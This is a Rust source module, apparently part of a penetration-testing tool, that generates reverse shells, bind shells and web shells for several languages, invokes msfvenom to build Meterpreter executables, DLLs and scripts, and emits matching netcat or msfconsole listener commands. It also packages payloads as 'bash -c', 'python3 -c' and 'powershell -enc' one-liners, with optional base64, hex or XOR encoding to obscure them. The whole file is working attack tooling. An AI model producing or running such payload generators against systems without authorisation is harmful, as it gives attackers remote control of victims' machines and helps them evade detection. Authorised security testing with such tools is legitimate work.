// Shell Generator Module
// Generates reverse shells, bind shells, and web shells

mod templates;
mod encoders;

use crate::scanner::exploitation::types::*;
use anyhow::{anyhow, Result};
use chrono::Utc;
use log::{info, warn};
use sha2::{Sha256, Digest};
use uuid::Uuid;

pub use templates::*;
pub use encoders::*;

/// Generate a shell payload based on configuration
pub async fn generate_shell(config: &ShellConfig) -> Result<ShellResult> {
    info!(
        "Generating {:?} {:?} shell for {:?}",
        config.shell_type, config.format, config.platform
    );

    let payload = if config.format.is_meterpreter() {
        generate_meterpreter_payload(config).await?
    } else {
        generate_script_payload(config)?
    };

    // Apply encoding if specified
    let encoded_payload = apply_encoding(&payload, &config.encoding, config.xor_key.as_deref())?;

    // Generate hash for tracking
    let mut hasher = Sha256::new();
    hasher.update(&encoded_payload);
    let payload_hash = format!("{:x}", hasher.finalize());

    // Generate listener command
    let listener_command = generate_listener_command(config);

    // Generate one-liner if applicable
    let one_liner = generate_one_liner(config, &encoded_payload);

    Ok(ShellResult {
        id: Uuid::new_v4().to_string(),
        payload: encoded_payload,
        payload_hash,
        format: config.format.clone(),
        platform: config.platform.clone(),
        listener_command,
        one_liner,
        created_at: Utc::now(),
    })
}

/// Generate a script-based payload
fn generate_script_payload(config: &ShellConfig) -> Result<String> {
    let payload = match (&config.shell_type, &config.format) {
        // Reverse shells
        (ShellType::ReverseShell, ShellFormat::Bash) => {
            templates::bash_reverse_shell(&config.lhost, config.lport)
        }
        (ShellType::ReverseShell, ShellFormat::PowerShell) => {
            templates::powershell_reverse_shell(&config.lhost, config.lport, config.obfuscation_level)
        }
        (ShellType::ReverseShell, ShellFormat::Python) => {
            templates::python_reverse_shell(&config.lhost, config.lport)
        }
        (ShellType::ReverseShell, ShellFormat::Perl) => {
            templates::perl_reverse_shell(&config.lhost, config.lport)
        }
        (ShellType::ReverseShell, ShellFormat::Php) => {
            templates::php_reverse_shell(&config.lhost, config.lport)
        }

        // Bind shells
        (ShellType::BindShell, ShellFormat::Bash) => {
            templates::bash_bind_shell(config.lport)
        }
        (ShellType::BindShell, ShellFormat::PowerShell) => {
            templates::powershell_bind_shell(config.lport)
        }
        (ShellType::BindShell, ShellFormat::Python) => {
            templates::python_bind_shell(config.lport)
        }

        // Web shells
        (ShellType::WebShell, ShellFormat::Php) => {
            templates::php_web_shell()
        }
        (ShellType::WebShell, ShellFormat::Aspx) => {
            templates::aspx_web_shell()
        }
        (ShellType::WebShell, ShellFormat::Jsp) => {
            templates::jsp_web_shell()
        }

        _ => {
            return Err(anyhow!(
                "Unsupported shell type/format combination: {:?}/{:?}",
                config.shell_type,
                config.format
            ));
        }
    };

    Ok(payload)
}

/// Generate a Meterpreter payload using msfvenom
async fn generate_meterpreter_payload(config: &ShellConfig) -> Result<String> {
    // Check if msfvenom is available
    let msfvenom_check = tokio::process::Command::new("msfvenom")
        .arg("--version")
        .output()
        .await;

    if msfvenom_check.is_err() {
        return Err(anyhow!(
            "msfvenom not found. Please install Metasploit Framework."
        ));
    }

    let (payload_name, format_flag) = match &config.format {
        ShellFormat::MeterpreterExe => ("windows/meterpreter/reverse_tcp", "exe"),
        ShellFormat::MeterpreterElf => ("linux/x64/meterpreter/reverse_tcp", "elf"),
        ShellFormat::MeterpreterDll => ("windows/meterpreter/reverse_tcp", "dll"),
        ShellFormat::MeterpreterPowerShell => ("windows/meterpreter/reverse_tcp", "psh"),
        ShellFormat::MeterpreterPython => ("python/meterpreter/reverse_tcp", "raw"),
        _ => return Err(anyhow!("Not a Meterpreter format: {:?}", config.format)),
    };

    let staged_payload = if config.staged {
        payload_name.to_string()
    } else {
        payload_name.replace("/reverse_tcp", "_reverse_tcp")
    };

    info!(
        "Generating Meterpreter payload: {} (format: {})",
        staged_payload, format_flag
    );

    let output = tokio::process::Command::new("msfvenom")
        .args([
            "-p",
            &staged_payload,
            &format!("LHOST={}", config.lhost),
            &format!("LPORT={}", config.lport),
            "-f",
            format_flag,
        ])
        .output()
        .await?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(anyhow!("msfvenom failed: {}", stderr));
    }

    // For binary formats, base64 encode the output
    if matches!(
        config.format,
        ShellFormat::MeterpreterExe | ShellFormat::MeterpreterElf | ShellFormat::MeterpreterDll
    ) {
        use base64::{engine::general_purpose::STANDARD, Engine};
        Ok(STANDARD.encode(&output.stdout))
    } else {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }
}

/// Generate listener command for the shell
fn generate_listener_command(config: &ShellConfig) -> String {
    match config.shell_type {
        ShellType::ReverseShell => {
            if config.format.is_meterpreter() {
                format!(
                    r#"msfconsole -x "use exploit/multi/handler; set PAYLOAD {}; set LHOST {}; set LPORT {}; exploit""#,
                    get_meterpreter_payload_name(&config.format, &config.platform),
                    config.lhost,
                    config.lport
                )
            } else {
                format!("nc -lvnp {}", config.lport)
            }
        }
        ShellType::BindShell => {
            format!("nc -v {} {}", config.lhost, config.lport)
        }
        ShellType::WebShell => {
            "# Access the web shell via browser or curl".to_string()
        }
    }
}

/// Get Meterpreter payload name for msfconsole
fn get_meterpreter_payload_name(format: &ShellFormat, platform: &Platform) -> String {
    match (format, platform) {
        (ShellFormat::MeterpreterExe | ShellFormat::MeterpreterDll | ShellFormat::MeterpreterPowerShell, _) => {
            "windows/meterpreter/reverse_tcp".to_string()
        }
        (ShellFormat::MeterpreterElf, _) => "linux/x64/meterpreter/reverse_tcp".to_string(),
        (ShellFormat::MeterpreterPython, _) => "python/meterpreter/reverse_tcp".to_string(),
        _ => "multi/handler".to_string(),
    }
}

/// Generate a one-liner command if applicable
fn generate_one_liner(config: &ShellConfig, payload: &str) -> Option<String> {
    match &config.format {
        ShellFormat::Bash => Some(format!(
            "bash -c '{}'",
            payload.replace('\n', "; ").replace("  ", " ")
        )),
        ShellFormat::PowerShell => {
            use base64::{engine::general_purpose::STANDARD, Engine};
            // PowerShell one-liner with base64 encoded command
            let encoded = STANDARD.encode(payload.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());
            Some(format!("powershell -enc {}", encoded))
        }
        ShellFormat::Python => Some(format!(
            "python3 -c '{}'",
            payload.replace('\n', "; ").replace("'", "\\'")
        )),
        _ => None,
    }
}

/// Apply encoding to payload
fn apply_encoding(
    payload: &str,
    encoding: &EncodingType,
    xor_key: Option<&str>,
) -> Result<String> {
    match encoding {
        EncodingType::None => Ok(payload.to_string()),
        EncodingType::Base64 => {
            use base64::{engine::general_purpose::STANDARD, Engine};
            Ok(STANDARD.encode(payload))
        }
        EncodingType::Hex => Ok(hex::encode(payload)),
        EncodingType::Xor => {
            let key = xor_key.ok_or_else(|| anyhow!("XOR encoding requires a key"))?;
            Ok(encoders::xor_encode(payload, key))
        }
    }
}
